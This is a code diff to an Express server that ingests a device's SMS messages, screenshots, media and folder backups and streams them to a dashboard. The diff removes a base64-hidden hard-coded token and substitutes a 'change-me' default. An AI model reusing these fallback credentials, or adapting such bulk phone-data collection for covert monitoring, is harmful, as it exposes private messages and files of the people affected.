@@ -16,11 +16,8 @@ const wss = new WebSocketServer({ server });
 
 const NEXUS_ROOT = process.env.NEXUS_ROOT || '/opt/data/nexus-local';
 const DATA_DIR = process.env.NEXUS_DATA_DIR || path.join(NEXUS_ROOT, 'data');
-const DASHBOARD_DIR = process.env.NEXUS_DASHBOARD_DIR || path.join(NEXUS_ROOT, 'dashboard');
-const TOKEN = process.env.NEXUS_TOKEN || (() => {
-  try { return Buffer.from('bmV4dXMyMDI0c2VjdXJl', 'base64').toString('utf8'); }
-  catch { return ''; }
-})();
+const DASHBOARD_DIR = process.env.NEXUS_DASHBOARD_DIR || path.join(__dirname, 'dashboard');
+const TOKEN = process.env.NEXUS_TOKEN || 'change-me';
 const ONLINE_WINDOW_MS = 5 * 60 * 1000;
 const MAX_RECORDS = 10000;
 
@@ -123,9 +120,10 @@ const storage = multer.diskStorage({
     fs.mkdirSync(dir, { recursive: true });
     cb(null, dir);
   },
-  filename: (req, file, cb) => cb(null, safeFilename(file.originalname))
+  filename: (req, file, cb) => cb(null, `${Date.now()}_${uuidv4()}_${safeFilename(file.originalname)}`)
 });
-const upload = multer({ storage, limits: { fileSize: 200 * 1024 * 1024 } });
+const MAX_MEDIA_UPLOAD_BYTES = 1024 * 1024 * 1024;
+const upload = multer({ storage, limits: { fileSize: MAX_MEDIA_UPLOAD_BYTES } });
 
 const audioStorage = multer.diskStorage({
   destination: (req, file, cb) => {
@@ -146,6 +144,16 @@ const screenshotStorage = multer.diskStorage({
   filename: (req, file, cb) => cb(null, `${Date.now()}_${safeFilename(file.originalname)}`)
 });
 const uploadScreenshot = multer({ storage: screenshotStorage, limits: { fileSize: 50 * 1024 * 1024 } });
+
+const backupStorage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    const dir = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId));
+    fs.mkdirSync(dir, { recursive: true });
+    cb(null, dir);
+  },
+  filename: (req, file, cb) => cb(null, `${Date.now()}_${uuidv4()}_${safeFilename(file.originalname)}`)
+});
+const uploadBackup = multer({ storage: backupStorage, limits: { fileSize: 1024 * 1024 * 1024 } });
 
 // ═══════════════════════════════════════════════════════════
 // API ROUTES
@@ -312,21 +320,29 @@ app.post('/api/media/:deviceId', checkAuth, upload.single('file'), (req, res) =>
   const { originalname, filename, size, mimetype } = req.file;
   const safeOriginalName = safeFilename(originalname);
 
-  // Dedup check
+  // Dedup check before committing the temp upload to the public media name.
   const metaFile = path.join(DATA_DIR, 'media', deviceId, 'meta.json');
   const meta = readJSON(metaFile, []);
-  const exists = meta.find(m => m.name === safeOriginalName && m.size === size);
+  const exists = meta.find(m => (m.originalName || m.name) === safeOriginalName && m.size === size);
   if (exists) {
-    // Multer ha già scritto/aggiornato il file con lo stesso nome. Non cancellarlo:
-    // una riconciliazione completa deve poter considerare il dedup come successo.
-    return res.json({ ok: true, dedup: true, filename });
+    try { fs.unlinkSync(req.file.path); } catch {}
+    return res.json({ ok: true, dedup: true, filename: exists.name });
   }
 
-  const entry = { name: safeOriginalName, size, mime: mimetype, ts: Date.now() };
+  const mediaDir = path.join(DATA_DIR, 'media', deviceId);
+  let finalName = safeOriginalName;
+  let finalPath = path.join(mediaDir, finalName);
+  if (fs.existsSync(finalPath)) {
+    finalName = `${Date.now()}_${safeOriginalName}`;
+    finalPath = path.join(mediaDir, finalName);
+  }
+  fs.renameSync(req.file.path, finalPath);
+
+  const entry = { name: finalName, originalName: safeOriginalName, size, mime: mimetype, ts: Date.now() };
   meta.push(entry);
   writeJSON(metaFile, meta);
   broadcast('media_new', { deviceId, ...entry });
-  res.json({ ok: true, filename });
+  res.json({ ok: true, filename: finalName });
 });
 
 app.get('/api/media/:deviceId', checkAuth, (req, res) => {
@@ -439,6 +455,43 @@ app.get('/api/screenshot/:deviceId/:filename', checkAuth, (req, res) => {
   res.sendFile(file);
 });
 
+// ── Backup/cartella extra: separato dalla galleria MediaStore ───────────────
+app.post('/api/backups/:deviceId', checkAuth, uploadBackup.single('file'), (req, res) => {
+  const deviceId = safeDeviceId(req.params.deviceId);
+  if (!req.file) return res.status(400).json({ ok: false, error: 'no file' });
+  const metaFile = path.join(DATA_DIR, 'backups', deviceId, 'meta.json');
+  const meta = readJSON(metaFile, []);
+  const originalName = safeFilename(req.file.originalname);
+  const exists = meta.find(m => m.originalName === originalName && m.size === req.file.size);
+  if (exists) {
+    try { fs.unlinkSync(req.file.path); } catch {}
+    return res.json({ ok: true, dedup: true, filename: exists.name });
+  }
+  const entry = {
+    name: req.file.filename,
+    originalName,
+    size: req.file.size,
+    mime: req.file.mimetype,
+    ts: Date.now(),
+    source: 'extra_folder'
+  };
+  meta.unshift(entry);
+  writeJSON(metaFile, bounded(meta));
+  broadcast('backup_new', { deviceId, ...entry });
+  res.json({ ok: true, filename: entry.name });
+});
+
+app.get('/api/backups/:deviceId', checkAuth, (req, res) => {
+  const metaFile = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId), 'meta.json');
+  res.json(readJSON(metaFile, []));
+});
+
+app.get('/api/backups/:deviceId/:filename', checkAuth, (req, res) => {
+  const file = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId), safeFilename(req.params.filename));
+  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
+  res.sendFile(file);
+});
+
 // ── SMS ───────────────────────────────────────────────────────
 app.post('/api/sms/:deviceId', checkAuth, (req, res) => {
   const { deviceId } = req.params;
@@ -446,8 +499,14 @@ app.post('/api/sms/:deviceId', checkAuth, (req, res) => {
   if (!Array.isArray(messages)) return res.json({ ok: false });
   const file = deviceFile('sms', deviceId);
   const existing = readJSON(file, []);
-  const ids = new Set(existing.map(m => m.id || m._id));
-  const newMsgs = messages.filter(m => !ids.has(m.id || m._id));
+  const smsKey = m => (m.id || m._id) ? `id:${m.id || m._id}` : `fallback:${m.address || m.number || m.phoneNumber || m.from || ''}:${m.date || m.timestamp || m.ts || ''}:${m.body || m.text || m.message || ''}`;
+  const ids = new Set(existing.map(smsKey));
+  const newMsgs = messages.filter(m => {
+    const key = smsKey(m);
+    if (ids.has(key)) return false;
+    ids.add(key);
+    return true;
+  });
   writeJSON(file, bounded([...existing, ...newMsgs]));
   if (newMsgs.length) broadcast('sms_new', { deviceId, count: newMsgs.length });
   res.json({ ok: true, added: newMsgs.length });
